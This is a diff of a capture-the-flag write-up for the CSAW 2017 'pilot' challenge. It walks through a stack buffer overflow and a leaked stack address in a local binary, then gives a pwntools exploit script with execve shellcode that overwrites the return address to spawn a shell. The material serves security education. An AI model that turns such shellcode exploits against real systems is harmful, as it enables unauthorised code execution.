@@ -1,109 +1,105 @@
 # Csaw 2017 pilot
 
+This was done on `Ubuntu 20.04.4 LTS`.
+
 Let's take a look at the binary:
 
-```
-$	file pilot 
-pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
-$	./pilot 
-[*]Welcome DropShip Pilot...
-[*]I am your assitant A.I....
-[*]I will be guiding you through the tutorial....
-[*]As a first step, lets learn how to land at the designated location....
-[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
-[*]Good Luck Pilot!....
-[*]Location:0x7ffcfd6d92c0
-[*]Command:15935728
-```
+![pwn_checksec](pics/pwn_checksec.png)
 
-So we can see that we are dealing with a 64 bit binary. When we run it, we see that it prints out a lot of text, including what looks like a memory address from the stack memory region. It then prompts us for input. Looking through the functions in Ghidra, we don't see a function labeled main. However we can find function `FUN_004009a6` which contains a lot of strings that we saw the program and output, and it looks like what we would expect to see:
+And now run the bindary:
+
+![running](pics/running.png)
+
+So we can see that we are dealing with a 64 bit binary. When we run it, we see that it prints out a lot of text, including what looks like a memory address from the stack memory region. It then prompts us for input. Looking through the functions in Ghidra, we don't see a function labeled main. This is because the symbol for `main` is stripped from the binary. There are several ways we can find the main function. One such way is looking at the `entry` function, and the first argument to the `__libc_start_main` function, which we see is the `0x004009a6` function:
+
+![libc_start_main](pics/libc_start_main.png)
+
+We can aslo find the function, via looking at the xrefs to the strings we see printed, which also leads us to the `0x004009a6` function:
+
+![strings_xref](pics/strings_xref.png)
+
+However we can find function `FUN_004009a6` which contains a lot of strings that we saw the program and output, and it looks like what we would expect to see:
 
 ```
-
 undefined8 FUN_004009a6(void)
 
 {
-  basic_ostream *this;
-  basic_ostream<char,std--char_traits<char>> *this_00;
-  ssize_t sVar1;
-  undefined8 uVar2;
-  undefined input [32];
+  basic_ostream *pbVar1;
+  basic_ostream<char,std::char_traits<char>> *this;
+  ssize_t sVar2;
+  undefined8 uVar3;
+  undefined local_28 [32];
   
   setvbuf(stdout,(char *)0x0,2,0);
   setvbuf(stdin,(char *)0x0,2,0);
-  this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Welcome DropShip Pilot...");
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]I am your assitant A.I....");
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>
-                   ((basic_ostream *)cout,"[*]I will be guiding you through the tutorial....");
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>
-                   ((basic_ostream *)cout,
-                    "[*]As a first step, lets learn how to land at the designated location....");
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>
-                   ((basic_ostream *)cout,
-                                        
-                    "[*]Your mission is to lead the dropship to the right location and executesequence of instructions to save Marines & Medics..."
-                   );
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Good Luck Pilot!....");
-  operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>);
-  this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Location:");
-  this_00 = (basic_ostream<char,std--char_traits<char>> *)
-            operator<<((basic_ostream<char,std--char_traits<char>> *)this,input);
-  operator<<(this_00,endl<char,std--char_traits<char>>);
-  operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Command:");
-  sVar1 = read(0,input,0x40);
-  if (sVar1 < 5) {
-    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]There are no commands....");
-    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
-    ;
-    this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Mission Failed....");
-    operator<<((basic_ostream<char,std--char_traits<char>> *)this,endl<char,std--char_traits<char>>)
-    ;
-    uVar2 = 0xffffffff;
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Welcome DropShip Pilot...");
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]I am your assitant A.I....");
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,
+                           "[*]I will be guiding you through the tutorial....");
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,
+                           "[*]As a first step, lets learn how to land at the designated location... ."
+                          );
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,
+                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
+                          );
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Good Luck Pilot!....");
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+             std::endl<char,std::char_traits<char>>);
+  pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Location:");
+  this = (basic_ostream<char,std::char_traits<char>> *)
+         std::basic_ostream<char,std::char_traits<char>>::operator<<
+                   ((basic_ostream<char,std::char_traits<char>> *)pbVar1,local_28);
+  std::basic_ostream<char,std::char_traits<char>>::operator<<
+            (this,std::endl<char,std::char_traits<char>>);
+  std::operator<<((basic_ostream *)std::cout,"[*]Command:");
+  sVar2 = read(0,local_28,0x40);
+  if (sVar2 < 5) {
+    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]There are no commands....");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<
+              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+               std::endl<char,std::char_traits<char>>);
+    pbVar1 = std::operator<<((basic_ostream *)std::cout,"[*]Mission Failed....");
+    std::basic_ostream<char,std::char_traits<char>>::operator<<
+              ((basic_ostream<char,std::char_traits<char>> *)pbVar1,
+               std::endl<char,std::char_traits<char>>);
+    uVar3 = 0xffffffff;
   }
   else {
-    uVar2 = 0;
+    uVar3 = 0;
   }
-  return uVar2;
+  return uVar3;
 }
 ```
 
-Looking through this code, we see that it prints a lot of text. However there are two important sections. The first is where it scans in the data:
+Looking through this code, we see that it prints a lot of text. However there are two important sections. The first is where it scans in the data with the `read` call:
 
-```
-  sVar1 = read(0,input,0x40);
-```
+![read](pics/read.png)
 
-We can see that it scans in `0x40` bytes worth of input into `input`. The char array `input` can only hold `32` bytes worth of input, so we have an overflow. Also we can see that the address printed is an infoleak (information about the program that is leak) for the start of our input in memory on the stack:
+We can see that it scans in `0x40` bytes worth of input into `input`. The char array `input` can only hold `32` (`0x20`) bytes worth of input, so we have an overflow. Also we can see that the address printed is an infoleak (information about the program that is leak) for the start of our input in memory on the stack:
 
-```
-  this = operator<<<std--char_traits<char>>((basic_ostream *)cout,"[*]Location:");
-  this_00 = (basic_ostream<char,std--char_traits<char>> *)
-            operator<<((basic_ostream<char,std--char_traits<char>> *)this,input);
-  operator<<(this_00,endl<char,std--char_traits<char>>);
-```
+![infoleak](pics/infoleak.png)
 
-Looking at the stack layout in Ghidra, there doesn't really look like there is anything between the start of our input and the return address. With our overflow we should be able to overwrite the return address and get code execution:
+Looking at the stack layout in Ghidra, there doesn't really look like there is anything between the start of our input and the return address. With our overflow we should be able to overwrite the return address and get code execution. Looking at the stack layout, we see that our input is stored at offset `0x28`, so we should be able to reach the saved return address from the start of our input with `0x28` bytes:
 
-```
-                             **************************************************************
-                             *                          FUNCTION                          *
-                             **************************************************************
-                             undefined FUN_004009a6()
-             undefined         AL:1           <RETURN>
-             undefined[32]     Stack[-0x28]   input                                   XREF[2]:     00400aa4(*), 
-                                                                                                   00400acf(*)  
-                             FUN_004009a6                                    XREF[4]:     entry:004008cd(*), 
-                                                                                          entry:004008cd(*), 00400de0, 
-                                                                                          00400e80(*)  
-        004009a6 55              PUSH       RBP
-```
+![stack_layout](pics/stack_layout.png)
 
-Let's find the offset between the start of our input and the return address using gdb. We will set a breakpoint for right after the read call, and look at the memory there:
+We can also find the offset between the start of our input and the return address using gdb. We will set a breakpoint for right after the read call, and look at the memory there:
 
 ```
 gef➤  b *0x400ae5
@@ -188,20 +184,20 @@ from pwn import *
 
 target = process('./pilot')
 
-print target.recvuntil("[*]Location:")
+print(target.recvuntil(b"[*]Location:"))
 
 leak = target.recvline()
 
-inputAdr = int(leak.strip("\n"), 16)
+inputAdr = int(leak.strip(b"\n"), 16)
 
-payload = ""
+payload = b""
 # This shellcode is originally from: https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/
 # However it looks like that site is down now
 # This shellcode will pop a shell when we run it
-payload += "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
+payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 
 
 # Padding to the return address
-payload += "0"*(0x28 - len(payload))
+payload += b"0"*(0x28 - len(payload))
 
 # Overwrite the return address with the address of the start of our input
 payload += p64(inputAdr)
@@ -214,23 +210,6 @@ target.interactive()
 
 When we run it:
 
-```
-$	python exploit.py 
-[+] Starting local process './pilot': pid 5764
-[*]Welcome DropShip Pilot...
-[*]I am your assitant A.I....
-[*]I will be guiding you through the tutorial....
-[*]As a first step, lets learn how to land at the designated location....
-[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
-[*]Good Luck Pilot!....
-[*]Location:
-[*] Switching to interactive mode
-[*]Command:$ w
- 20:49:30 up  3:36,  1 user,  load average: 0.32, 0.11, 0.09
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu tty7     :0               17:14    3:36m  1:02   0.17s /sbin/upstart --user
-$ ls
-exploit.py  pilot
-```
+![running_exploit](pics/running_exploit.png)
 
 Just like that, we popped a shell!
